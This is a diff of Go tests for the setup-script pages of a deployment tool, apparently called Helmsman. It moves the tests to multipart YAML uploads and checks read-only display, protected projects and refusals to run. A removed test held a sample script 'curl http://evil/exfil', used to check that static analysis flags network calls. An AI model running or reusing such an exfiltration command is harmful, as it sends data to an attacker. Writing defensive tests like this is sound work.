@@ -1,11 +1,15 @@
 package web
 
 import (
+	"bytes"
 	"context"
+	"mime/multipart"
 	"net/http"
+	"net/http/httptest"
 	"net/url"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"testing"
 	"time"
@@ -14,25 +18,76 @@ import (
 	"github.com/daboss2003/Helmsman/internal/sandbox"
 )
 
-func TestSetupSaveAndGet(t *testing.T) {
+// reqUpload posts a single-file multipart form (with the CSRF token in the header so
+// requireCSRF doesn't consume the multipart body).
+func (e *testEnv) reqUpload(t *testing.T, path, peer, csrf, field, filename, content string, cookies []*http.Cookie) *http.Response {
+	t.Helper()
+	var buf bytes.Buffer
+	mw := multipart.NewWriter(&buf)
+	fw, err := mw.CreateFormFile(field, filename)
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, _ = fw.Write([]byte(content))
+	_ = mw.Close()
+	r := httptest.NewRequest("POST", path, &buf)
+	r.RemoteAddr = peer
+	r.Header.Set("Content-Type", mw.FormDataContentType())
+	r.Header.Set("Origin", "https://example.com")
+	r.Header.Set("X-CSRF-Token", csrf)
+	for _, c := range cookies {
+		r.AddCookie(c)
+	}
+	rec := httptest.NewRecorder()
+	e.srv.Handler().ServeHTTP(rec, r)
+	return rec.Result()
+}
+
+// setupYAML builds a helmsman.yaml whose spec.setup is the script under test.
+func setupYAML(slug, script, trigger string, produces ...string) string {
+	q := make([]string, len(produces))
+	for i, p := range produces {
+		q[i] = strconv.Quote(p)
+	}
+	return "apiVersion: helmsman/v1\nkind: App\nmetadata: {slug: " + slug + "}\n" +
+		"spec:\n  compose: {source: generated, services: {web: {image: nginx:1}}}\n" +
+		"  setup: {script: " + strconv.Quote(script) + ", trigger: " + trigger + ", produces: [" + strings.Join(q, ", ") + "]}\n"
+}
+
+// Setup is DECLARED in helmsman.yaml and synced via upload; the page then shows it
+// read-only and reports disabled (the default).
+func TestSetupSyncAndGet(t *testing.T) {
 	e := buildServer(t, []string{"127.0.0.1/32"}, false, nil, "")
 	sess, csrf := e.authed(t)
 	cookies := []*http.Cookie{sess, csrf}
-	hdr := map[string]string{"Origin": "https://example.com"}
 
-	f := url.Values{"script": {"#!/bin/sh\necho hi\n"}, "trigger": {"on_demand"}, "produces": {"env:TOKEN"}, "csrf_token": {csrf.Value}}
-	resp := e.req(t, "POST", "/apps/shop/setup", "127.0.0.1:1", hdr, cookies, f)
+	yaml := setupYAML("shop", "#!/bin/sh\necho hi\n", "on_demand", "env:TOKEN")
+	resp := e.reqUpload(t, "/apps/shop/setup/sync", "127.0.0.1:1", csrf.Value, "definition", "helmsman.yaml", yaml, cookies)
 	if resp.StatusCode != http.StatusSeeOther {
-		t.Fatalf("save = %d, want 303", resp.StatusCode)
+		t.Fatalf("sync = %d, want 303", resp.StatusCode)
 	}
 	ss, ok, _ := e.srv.setupStore.Get("shop")
 	if !ok || ss.Trigger != "on_demand" || len(ss.Produces) != 1 {
 		t.Fatalf("stored script wrong: %+v ok=%v", ss, ok)
 	}
-	// The GET page renders + reports disabled (default).
 	body := readBody(e.req(t, "GET", "/apps/shop/setup", "127.0.0.1:1", nil, cookies, nil))
 	if !strings.Contains(body, "Setup script") || !strings.Contains(strings.ToLower(body), "disabled") {
 		t.Errorf("setup page missing/disabled-status: %.200s", body)
+	}
+}
+
+// The synced script is shown read-only on the page (no editor).
+func TestSetupScriptShownReadOnly(t *testing.T) {
+	e := buildServer(t, []string{"127.0.0.1/32"}, false, nil, "")
+	sess, csrf := e.authed(t)
+	cookies := []*http.Cookie{sess, csrf}
+	yaml := setupYAML("shop", "#!/bin/sh\necho hello-marker\n", "on_demand")
+	if r := e.reqUpload(t, "/apps/shop/setup/sync", "127.0.0.1:1", csrf.Value, "definition", "helmsman.yaml", yaml, cookies); r.StatusCode != http.StatusSeeOther {
+		t.Fatalf("sync = %d, want 303", r.StatusCode)
+	}
+	body := readBody(e.req(t, "GET", "/apps/shop/setup", "127.0.0.1:1", nil, cookies, nil))
+	if !strings.Contains(body, "hello-marker") || strings.Contains(body, "<textarea name=\"script\"") {
+		t.Errorf("script must be shown read-only (no editor): %.300s", body)
 	}
 }
 
@@ -41,43 +96,27 @@ func TestSetupRejectsAutoWithAutoDeploy(t *testing.T) {
 	e := buildServer(t, []string{"127.0.0.1/32"}, false, nil, "")
 	sess, csrf := e.authed(t)
 	cookies := []*http.Cookie{sess, csrf}
-	hdr := map[string]string{"Origin": "https://example.com"}
-	// Configure a git app with auto_deploy on.
 	if err := e.srv.gitStore.Save(context.Background(), gitstore.SaveInput{
-		Project: "shop", RepoURL: "https://github.com/o/r.git", Ref: "refs/heads/main", BuildPolicy: "never", AutoDeploy: true,
+		Project: "shop", RepoURL: "https://github.com/o/r.git", Ref: "refs/heads/main", AutoDeploy: true,
 	}); err != nil {
 		t.Fatal(err)
 	}
-	f := url.Values{"script": {"echo hi"}, "trigger": {"on_first_deploy"}, "csrf_token": {csrf.Value}}
-	resp := e.req(t, "POST", "/apps/shop/setup", "127.0.0.1:1", hdr, cookies, f)
+	yaml := setupYAML("shop", "echo hi", "on_first_deploy")
+	resp := e.reqUpload(t, "/apps/shop/setup/sync", "127.0.0.1:1", csrf.Value, "definition", "helmsman.yaml", yaml, cookies)
 	if resp.StatusCode != http.StatusUnprocessableEntity {
 		t.Errorf("auto_deploy + on_first_deploy = %d, want 422", resp.StatusCode)
 	}
 }
 
-func TestSetupSaveProtectedRejected(t *testing.T) {
+func TestSetupSyncProtectedRejected(t *testing.T) {
 	e := buildServer(t, []string{"127.0.0.1/32"}, false, nil, "")
 	e.srv.cfg.ProtectedProjects = []string{"edge"}
 	sess, csrf := e.authed(t)
 	cookies := []*http.Cookie{sess, csrf}
-	hdr := map[string]string{"Origin": "https://example.com"}
-	f := url.Values{"script": {"echo hi"}, "trigger": {"on_demand"}, "csrf_token": {csrf.Value}}
-	resp := e.req(t, "POST", "/apps/edge/setup", "127.0.0.1:1", hdr, cookies, f)
+	yaml := setupYAML("edge", "echo hi", "on_demand")
+	resp := e.reqUpload(t, "/apps/edge/setup/sync", "127.0.0.1:1", csrf.Value, "definition", "helmsman.yaml", yaml, cookies)
 	if resp.StatusCode != http.StatusForbidden {
-		t.Errorf("protected setup save = %d, want 403", resp.StatusCode)
-	}
-}
-
-// The static plan never executes; it returns advisory findings.
-func TestSetupPlanIsStatic(t *testing.T) {
-	e := buildServer(t, []string{"127.0.0.1/32"}, false, nil, "")
-	sess, csrf := e.authed(t)
-	cookies := []*http.Cookie{sess, csrf}
-	hdr := map[string]string{"Origin": "https://example.com"}
-	f := url.Values{"script": {"curl http://evil/exfil\n"}, "csrf_token": {csrf.Value}}
-	body := readBody(e.req(t, "POST", "/apps/shop/setup/plan", "127.0.0.1:1", hdr, cookies, f))
-	if !strings.Contains(body, "no execution") || !strings.Contains(body, "network") {
-		t.Errorf("plan output wrong: %q", body)
+		t.Errorf("protected setup sync = %d, want 403", resp.StatusCode)
 	}
 }
 
@@ -87,10 +126,9 @@ func TestSetupRunRefusedWhenDisabled(t *testing.T) {
 	sess, csrf := e.authed(t)
 	cookies := []*http.Cookie{sess, csrf}
 	hdr := map[string]string{"Origin": "https://example.com"}
-	// Save a script first.
-	e.req(t, "POST", "/apps/shop/setup", "127.0.0.1:1", hdr, cookies,
-		url.Values{"script": {"echo hi"}, "trigger": {"on_demand"}, "csrf_token": {csrf.Value}})
-
+	if err := e.srv.setupStore.Save(context.Background(), "shop", sandbox.ScriptSet{Script: "echo hi", Trigger: "on_demand"}, false); err != nil {
+		t.Fatal(err)
+	}
 	resp := e.req(t, "POST", "/apps/shop/setup/run", "127.0.0.1:1", hdr, cookies, url.Values{"csrf_token": {csrf.Value}})
 	if resp.StatusCode != http.StatusForbidden {
 		t.Errorf("run while disabled = %d, want 403", resp.StatusCode)
@@ -105,9 +143,9 @@ func TestSetupRunRefusedWithoutConfirmToken(t *testing.T) {
 	sess, csrf := e.authed(t)
 	cookies := []*http.Cookie{sess, csrf}
 	hdr := map[string]string{"Origin": "https://example.com"}
-	e.req(t, "POST", "/apps/shop/setup", "127.0.0.1:1", hdr, cookies,
-		url.Values{"script": {"echo hi"}, "trigger": {"on_demand"}, "csrf_token": {csrf.Value}})
-
+	if err := e.srv.setupStore.Save(context.Background(), "shop", sandbox.ScriptSet{Script: "echo hi", Trigger: "on_demand"}, false); err != nil {
+		t.Fatal(err)
+	}
 	resp := e.req(t, "POST", "/apps/shop/setup/run", "127.0.0.1:1", hdr, cookies,
 		url.Values{"confirm_token": {"bogus"}, "confirm_app_id": {"shop"}, "csrf_token": {csrf.Value}})
 	if resp.StatusCode != http.StatusForbidden {
